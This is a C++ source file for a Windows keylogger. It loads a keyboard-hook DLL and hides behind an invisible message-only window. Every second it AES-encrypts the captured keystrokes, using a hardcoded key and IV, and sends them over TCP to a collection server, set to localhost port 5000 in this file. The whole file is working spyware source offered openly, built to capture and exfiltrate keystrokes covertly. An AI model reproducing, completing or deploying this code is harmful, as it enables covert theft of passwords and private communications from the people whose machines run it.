#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#include <iostream>
#include <thread>
#include <chrono>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>
// AES key and IV (must match server)
const unsigned char* AES_KEY = (const unsigned char*)"AfterLifeDeath00";
const unsigned char* AES_IV  = (const unsigned char*)"AfterDeathLife00";

// Encrypts plaintext to ciphertext using AES-128-CBC
int aes_encrypt(const unsigned char* plaintext, int plaintext_len, unsigned char* ciphertext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    int len, ciphertext_len;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, AES_KEY, AES_IV);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len);
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return ciphertext_len;
}

#pragma comment(lib, "ws2_32.lib")

typedef bool (__cdecl *StartKeyHookFunc)();
typedef void (__cdecl *StopKeyHookFunc)();
typedef const char* (__cdecl *GetKeyBufferFunc)();

HMODULE hDll = NULL;
StartKeyHookFunc StartKeyHook = nullptr;
StopKeyHookFunc StopKeyHook = nullptr;
GetKeyBufferFunc GetKeyBuffer = nullptr;

bool running = true;

SOCKET ConnectToServer(const char* ip, int port) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return INVALID_SOCKET;
    }

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "socket() failed\n";
        WSACleanup();
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "connect() failed\n";
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void KeyloggerLoop() {
    SOCKET sock = ConnectToServer("127.0.0.1", 5000);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to connect to server\n";
        return;
    }

    while (running) {
        const char* keys = GetKeyBuffer();
        if (keys && *keys != '\0') {
            int len = (int)strlen(keys);
            unsigned char ciphertext[2048];
            int ciphertext_len = aes_encrypt((const unsigned char*)keys, len, ciphertext);
            int sent = send(sock, (const char*)ciphertext, ciphertext_len, 0);
            if (sent == SOCKET_ERROR) {
                std::cerr << "send() failed\n";
                break;
            }
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    closesocket(sock);
    WSACleanup();
}

LRESULT CALLBACK DummyWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_CLOSE) {
        running = false;
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    // Carica la DLL
    hDll = LoadLibraryA("keyhook.dll");
    if (!hDll) {
        MessageBoxA(NULL, "Failed to load keyhook.dll", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    StartKeyHook = (StartKeyHookFunc)GetProcAddress(hDll, "StartKeyHook");
    StopKeyHook = (StopKeyHookFunc)GetProcAddress(hDll, "StopKeyHook");
    GetKeyBuffer = (GetKeyBufferFunc)GetProcAddress(hDll, "GetKeyBuffer");

    if (!StartKeyHook || !StopKeyHook || !GetKeyBuffer) {
        MessageBoxA(NULL, "Failed to get DLL functions", "Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hDll);
        return 1;
    }

    if (!StartKeyHook()) {
        MessageBoxA(NULL, "Failed to start key hook", "Error", MB_OK | MB_ICONERROR);
        FreeLibrary(hDll);
        return 1;
    }

    // Registra classe finestra invisibile
    WNDCLASSA wc = {0};
    wc.lpfnWndProc = DummyWndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "KeyloggerInvisibleWindow";
    RegisterClassA(&wc);

    HWND hwnd = CreateWindowA(wc.lpszClassName, "Keylogger", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

    // Avvia thread per invio dati
    std::thread senderThread(KeyloggerLoop);

    // Ciclo messaggi (serve a mantenere il hook attivo)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    running = false;
    senderThread.join();

    StopKeyHook();
    FreeLibrary(hDll);

    return 0;
}
